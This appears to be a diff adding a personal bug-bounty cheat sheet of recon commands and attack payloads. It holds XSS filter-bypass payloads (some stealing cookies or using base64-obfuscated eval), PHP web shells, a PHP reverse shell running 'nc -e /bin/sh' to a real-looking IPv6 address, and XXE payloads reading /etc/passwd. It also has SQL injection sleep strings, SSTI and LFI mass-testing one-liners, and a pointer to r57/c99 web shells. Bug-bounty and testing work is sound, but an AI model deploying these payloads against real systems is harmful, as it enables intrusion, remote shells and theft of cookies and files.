@@ -1,0 +1,199 @@
+#finding subdomains manually
+site:anything.eu
+site:projects.knmi.nl
+##########################
+Finding all websites on a single server
+dig axfr @ipofserver website_hosted_on_that_server +nostat +nocomments +nocmd
+
+######################################
+useful google droks for bug bounty:-
+
+site:your-target.com inurl:id=
+site:your-target.com filetype:php
+site:your-target.com intitle:upload
+inurl:”.php?id=” intext:”View cart”
+inurl:”.php?cid=” intext:”shopping”
+inurl:/news.php?include=
+inurl:”.php?query=”
+#####################################
+
+
+##Initial scanning using nmap for services
+nmap -PS -sV ip
+
+#checking for xss
+Advance alibaba xss firewall bypass payload:-
+'"><svg/onload=prompt(5);>{{7*7}}
+<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+<select><noembed></select><script x=’a@b’a>y=’a@b’//a@b%0a\u0061lert(1)</script x>
+<a+HREF=’%26%237javascrip%26%239t:alert%26lpar;document.domain)’>
+<sVg/oNloAd=”JaVaScRiPt:/**\/*\’/”\eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))”> 
+<iframe src=jaVaScrIpT:eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))>
+<a href=”j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this[‘document’][‘cookie’]&rpar;”>X</a>
+<iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”>
+%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0) 
+%253%63svg%2520onload=alert(1)%253%65 the firewall was blocking “%253c”
+<video</onload='1>(_=alert,_(`venom`))"><source>
+x";prompt(0);x="x"
+"><img src=x onerror=alert('xss'):><"
+a"><svg/onload=prompt(1)>
+"><svg onload=alert(document.domain)>
+javascript:alert(document.domain)
+<img src="x" onerror="alert('venom')">
+</script><svg onload=alert(venom)>
+<svg/onload=alert(1);
+"><img src=x onerror=alert(document.domain)>
+whenever your input reflect as plain text you should use svg vector
+<svg><script>alert&#40;1)</script>
+whenever they take url as input field you can try to inject payload through a file create a file file.js and write your script in it and then try to load that file using url.iF done then there is rfx (remote file xss)
+if your payload is displaying as a text then you need to convert the type 
+hello"type=image src onerror="alert(1)
+
+
+
+ and a paramater as Referer: venom
+ check wheather reflecting or not
+
+
+X-Forwarded-Host: http://bing.com
+
+
+;;;;;;;;;;;;;;;;;;;;;;
+
+html injection:-
+<A HREF="http://bing.com/">tony</A>
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+php payload:-
+<?php echo system($_REQUEST['venom']); ?>
+<?php system('ls');?>
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+XXE
+add this to post request in burp for checking xxe :-
+Content-type: application/xml
+
+and then at the end add xxe payloads
+
+simple xml payload:-
+<foo><text>venom</text></foo>
+OR
+     
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE dtgmlf6 [ <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+ <!ELEMENT employee(#PCDATA)>
+ <!ENTITY name SYSTEM "file:///etc/passwd">
+]>
+<employee>&name;</employee>
+
+############################
+php reverse shell code:-
+<?passthru("nc -e /bin/sh 2405:204:9212:2636:d54a:4d49:d0f3:3a3c 1234");?>
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+RCE
+Purpose of command  	Linux 	        Windows
+Name of current user 	whoami      	whoami
+Operating system 	    uname -a     	ver
+Network configuration 	ifconfig 	    ipconfig /all
+Network connections 	netstat -an     netstat -an
+Running processes 	    ps -ef 	        tasklist 
+
+
+
+#####################################
+to scan for mahines in your ntework
+nmap -sn 192.168.233.0/24
+
+
+##################################
+sqli:-
+,sleep(5*5),0))OR'
+1 AND 1=(select 1 from PG_SLEEP(10)) — ‘ AND 1=(select 1 from PG_SLEEP(10)) OR ‘1’=’
+1 AND 1=(select 1 from PG_SLEEP(10)) — ‘ AND 1=(select 1 from PG_SLEEP(10)) OR ‘1’=’
+1;sleep${IFS}9;#${IFS}’;sleep${IFS}9;#${IFS}”;sleep${IFS}9;#${IFS}
+
+###################################
+you can get well web shells at r57.gen.tr website
+r57 and c99 are realy good web shells
+
+X-Forwarded-For: 127.0.0.1, 127.0.01, 127.0.0.1
+X-HackerOne: Shopify
+Content-Length: 69
+
+{"query": "query allLocations{allLocations{address, code, contact}}"}
+
+
+systemctl snapshot:-takes snapshot of system can be used if system got crashed do study
+
+python:-7.38
+
+#download all avaliable version of an App
+curl -sf 'https://apkily.com/nubank' | awk -F '"' '/verid/{print $(NF-1)}' | xargs -P10 -I@ bash -c 'curl -sf "https://apkily.com/getapp" --data-raw "verid=@" | grep -oE "pool.apk.aptoide.*?\.apk"' | xargs -I@ -P10 sh -c 'wget @' 
+youtube channel:-kevin du and Wraiith75
+
+
+
+#While hunting for api look for following parameters using alt dns
+qa
+dev
+admin
+backend
+api
+stage
+web
+web-qa
+web-dev
+test
+test3
+uat
+beta
+
+#save this in a file patterns.txt
+altdns -i hosts.txt -o altdnsdata.txt -w patterns.txt -r -s altdnsoutput.txt -t 20
+
+
+OneLiner extracts all API endpoints from AngularJS & Angular javascript files: curl -s URL | grep -Po “(\/)((?:[a-zA-Z\-_\:\.0–9\{\}]+))(\/)*((?:[a-zA-Z\-_\:\.0–9\{\}]+))(\/)((?:[a-zA-Z\-_\/\:\.0–9\{\}]+))” | sort -u
+
+Simple Script for scanning ports of all grabbed subdomains using masscan:-
+for scan in $(cat <file-path>); do masscan -p1-65535 $(dig +short $scan|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|head -1) --max-rate 1000 |& tee -a port_scan
+
+#getting endpoints from wayback url list
+for i in $(cat wb.txt | awk '{print $2}'| perl -n -e 'm{http://[^/]+(/[^?]+)};print $1');do echo $i;done | tee -a endpoints.txt
+
+#getting endpoints form js files
+cat *.js | grep -o -E `(https?://)?/?[{}a-z0-9A-Z_\.-]{2,}/[{}/a-z0-9A-Z_\.-]+`
+
+#replacing \n with new line
+cat file | awk '{gsub(/\\n/,"\n")}1'
+
+
+#installing python3.6 on ubuntu 16.04 aws
+https://vsupalov.com/developing-with-python3-6-on-ubuntu-16-04/
+then to install python3.6-pip
+sudo python3.6 -m pip install -U pip
+
+cat ssti.txt | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
+
+cat lfi.txt | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+export LOCAL=http://localhost/; cat redirect.txt | qsreplace "$LOCAL" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LOCAL" && echo "VULN! {}"'
+
+#rustscan output parsing
+cat ports.txt | grep -iv batch | grep open | grep -i discovered | awk '{print $6,$4}' | cut -d '/' -f1 | awk '{print $1":"$2}' | less
+
+#checking for ec2 domain takeover
+while IFS= read -r domain; do if dig +short $domain | grep ec2; then echo $domain | tee -a ec2.txt; fi; done < domains
+interlace -tL all.txt -threads 10 -c 'if dig +short _target_ | grep ec2; then echo _target_ | tee -a dangling_subs.txt; fi'
+
+
+#checking for inscope target
+while IFS= read -r domain; do if whois $domain | grep 'organization name'; then echo $domain | tee -a potential.txt; fi; done < domains
+
+#clone all repositories of an org
+GHORG=facebookresearch; curl "https://api.github.com/orgs/$GHORG/repos?per_page=1000" | grep -o 'git@[^"]*' | sed 's/git@/https:\/\//g' |  sed 's/m:/m\//g' | xargs -L1 git clone
